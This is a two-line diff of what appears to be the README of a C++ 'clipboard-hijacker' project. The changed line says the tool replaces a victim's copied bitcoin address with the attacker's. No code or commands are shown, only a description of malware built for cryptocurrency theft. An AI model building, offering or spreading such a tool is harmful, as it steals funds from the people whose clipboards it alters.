@@ -1,2 +1,2 @@
 # clipboard-hijacker
-simple clipboard hijacker in c++ :))
+It will replace victim's btc address to attacker's whenever victim copies btc address.
